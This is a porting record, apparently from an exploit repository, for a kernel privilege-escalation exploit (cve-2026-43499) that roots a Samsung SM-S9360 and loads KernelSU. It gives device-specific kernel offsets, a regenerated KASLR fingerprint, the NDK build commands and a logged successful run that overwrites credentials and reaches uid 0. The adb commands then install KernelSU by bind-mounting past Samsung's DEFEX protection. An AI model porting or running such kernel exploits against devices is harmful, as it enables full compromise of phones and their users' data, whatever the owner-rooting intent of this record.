# SM-S9360 / S9360ZCSCCZG1 porting record

Device-tested temporary root + KernelSU (LKM jailbreak mode) on 2026-08-13.
Locked bootloader; no persistent boot.img modification. Re-establish per boot.

## 1. Firmware identity

| field | value |
| --- | --- |
| model | `SM-S9360` (Galaxy S25+, Greater China) |
| AP/PDA | `S9360ZCSCCZG1` |
| CSC | `S9360CHCCCZG1` (CHC, China mainland) |
| codename | `pa2q` |
| build fingerprint | `samsung/pa2qzcx/pa2q:16/BP4A.251205.006/S9360ZCSCCZG1_CHCCCZG1:user/release-keys` |
| kernel release | `6.6.98-android15-8-p5a696e2-abogkiS9360ZCSCCZG1-4k` |
| kernel SHA-256 | `e9f8b4ab5f8644b12c04ff7c1d3d1eee577c12753fe5a7651908c6408f4ae716` (raw Image from boot.img) |

This device uses the `p5a696e2-abogki` GKI base, **not** the `pa3q` GKI of the
S25 Ultra (`SM-S938x`). The shared `galaxy-s25-series` payload is built from
`pa3q-S938NKSUACZF1` and does not work on this device — the same situation as
`psq` (SM-S9370, Galaxy S25 Edge China); see
[`SM-S9370-S9370ZCS9CZG1.md`](SM-S9370-S9370ZCS9CZG1.md).

## 2. Why a separate profile — the cache-gate failure with the shared pa3q payload

Running the stock `galaxy-s25-series` payload (Root My Galaxy app) fails every
attempt. Decisive log lines (pids redacted):

```text
[+] 支持配置: galaxy-s25-series-2026-06-07
[+] build config label=pa3q-S938NKSUACZF1-app-physical-p0-oracle slide=pselect main=pselect
[*] pipe caches normal1k=0000000000000000 normal2k=0000000000000000 cgroup1k=0020000000000fc3 cgroup2k=0028000000000fc3 selected=0028000000000fc3
[*] phys step cache gate failed slab=ffffff8001cf4c00 want=0028000000000fc3
```

Root cause: `KMALLOC_CACHES_OFF` in the `pa3q` profile points to the wrong
address on this kernel, so the oracle reads garbage (`normal1k=0`,
`cgroup2k=0x0028000000000fc3` — not real slab-cache pointers) instead of the
kmalloc-2k cache pointer. The pipe pages' real slab cache
(`ffffff8001cf4c00`) never matches the garbage entries, so
`pipe_cache_matches()` fails every attempt. This is a deterministic offset
mismatch, not a race.

## 3. Offsets that differ from pa3q-S938NKSUACZF1

Only two kernel-data offsets differ. All other offsets were re-derived from
this kernel's `vmlinux` / BTF and match `pa3q` (all `.text` symbol offsets,
`task_struct`/`page`/`rt_mutex_waiter`/`file_operations`/workqueue struct
layouts, `SELINUX_ENFORCING_OFF`, `P0_*`, etc.).

| macro | pa3q (S25 Ultra) | pa2q (this device) | source |
| --- | ---: | ---: | --- |
| `KMALLOC_CACHES_OFF` | `0x017da710` | `0x017dac30` | `kmalloc_caches` symbol |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x0175e2a1` | `0x0175e75d` | `nfulnl_logger.name` pointer → `"nfnetlink_log"` string |

Both values are identical to `psq-S9370ZCS9CZG1`, as expected from the shared
`p5a696e2-abogki` GKI base; the profile is still keyed to the exact PDA
because the p0 fingerprint (below) is build-specific.

## 4. Physical load address

```c
#define P0_PHYS_OFFSET       0x80000000ULL   /* vendor_boot DTB gunyah_hyp_region@80000000 */
#define P0_KERNEL_PHYS_LOAD  0xa8000000ULL   /* uefi.elf literals + pa3q/psq agreement */
```

Qualcomm device; the BL has no `sboot.bin`. Same derivation as `psq`:
`0xa8000000` appears as a literal in `uefi.elf` (the UEFI LinuxLoader), and
the `pa3q` run reaching the cache gate confirms the direct-map address math.

## 5. SLIDE_PSELECT_WORD_SHIFT

Not overridden in `target.h`; the default in `slide_app.c` is `0`, which is
correct for this kernel (same reasoning as the `psq` record: non-LEGACY
`rt_mutex_waiter` words 0-13 with `nfds=320` ⇒ `SHIFT <= 1`).

## 6. p0 fingerprint

Regenerated from this kernel's raw Image with
`tools/generate_p0_fingerprint.pl` (`PROBE_OFFSET=0x1f0000`). It differs from
the `pa3q` table (e.g. row 0 word 1: `0xeb00029f943c802c` vs `pa3q`'s
`0xeb00029f943c77ac`), so the shared `pa3q` table cannot be reused. All 8
fingerprint rows were confirmed against the live kernel on device before the
first successful run.

## 7. KernelSU

The existing `kernelsu/ksud-s25u-kdp` (`android15-6.6` KMI) loads without
modification. Before first use the module was audited against this kernel's
`Module.symvers` (extracted from the stock boot image): no missing symbols
and no CRC mismatches (the module resolves its non-exported symbols via
`/proc/kallsyms` at load time, as designed). Samsung DEFEX Safeplace blocks
executing ksud from `/data/local/tmp/`; the daemon's `--late-load` bypasses
it by bind-mounting ksud over `/system/bin/logcat` in a private mount
namespace. KSU comes up in LKM jailbreak mode. No KernelSU rebuild or binary
patch is needed.

## 8. Build (macOS)

The exploit is built with the Android NDK on macOS. The Makefile hardcodes
the `linux-x86_64` prebuilt path; override `TARGET_CC` to `darwin-x86_64`.

```sh
NDK=$HOME/Library/Android/sdk/ndk/27.1.12297006    # NDK r27, API 35
CC="$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang"

make all TARGET=pa2q-S9360ZCSCCZG1 ANDROID_NDK_HOME="$NDK" TARGET_CC="$CC"
```

Outputs in `build/pa2q-S9360ZCSCCZG1/`:

| file | use |
| --- | --- |
| `cve-2026-43499` | root-umh variant (LD_PRELOAD) |
| `cve-2026-43499-app.so` | app variant (used via `--run-payload`) → copy to `artifacts/pa2q-S9360ZCSCCZG1/` |
| `cve-2026-43499-root` | root helper / su_daemon |

The kernel extraction + offset derivation procedure is in
[`docs/PORTING.md`](PORTING.md); this record only lists the device-specific
results.

## 9. Device validation (2026-08-13)

### Exploit

Successful run (attempt 4 of a batch; attempts 1-3 lost the fops/p0 races,
which is normal — the exploit is probabilistic). KASLR slide resolved by the
p0 fingerprint scan (`slide=0x140000`), slab cache matched, physical read/write
established, credentials overwritten:

```text
[+] exploit attempt=4/8 p0_offset=scan
[*] kernel page prepare mode=1 attempt=1/2 elapsed_ms=1892 base=ffffff8960da8000
[*] p0 physical slot=0..3 write attempt=1/1 delay=50000 nfds=320 pad=0
[*] app fops stage=trigger-return attempt=1 triggered=1
[*] pipe page idx=0 page=ffffff803c648000 head=fffffffe00f19200 cache08=ffffff8001cf4c00 ... match=1
[*] app fops slide attempt=1/1 triggered=1 verified=1 step=0 errno=0
[+] pipe-physrw-summary done=1 root=1 kaslr=1 base=ffffffc080140000 slide=0000000000140000
[+] pipe physrw done=1 root=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=4/8
```

Temporary root:

```sh
$ adb shell "/data/local/tmp/cve-2026-43499-root -c id"
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

Success rate is system-state dependent (futex/fops races): batches run right
after boot miss more often; on an idle, settled system several consecutive
successes are common. Occasional failures leave no persistent damage (the
exploit is memory-only; worst case is a kernel panic and reboot, observed a
few times during bring-up with no lasting effect).

### KernelSU install

```sh
$ adb shell "/data/local/tmp/cve-2026-43499-root -c 'echo 1 > /proc/sys/kernel/kptr_restrict'"
$ adb shell "cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage && chmod 755 /data/local/tmp/.ksud-stage"
$ adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
```

`--late-load` is silent on success. Recreate `.ksud-stage` before every
`--late-load` (the loader renames it to `/data/adb/ksud`). KernelSU grants
root to apps afterwards; the Root My Galaxy app flow (exploit → KernelSU
install) was also exercised end-to-end on this device.

## 10. Scope

Verified only for `SM-S9360` / `S9360ZCSCCZG1` (China mainland, `abogki`
GKI). `targets-v3.json` lists only `SM-S9360` for this payload.

Both temp root and KSU are per-boot (locked bootloader; no persistent boot.img
modification). Re-establish after reboot: exploit (`--run-payload`) →
`kptr_restrict=1` → recreate `/data/local/tmp/.ksud-stage` → `--late-load`.
The KernelSU configuration under `/data/adb/ksu` survives reboots; only the
privilege itself must be re-acquired.
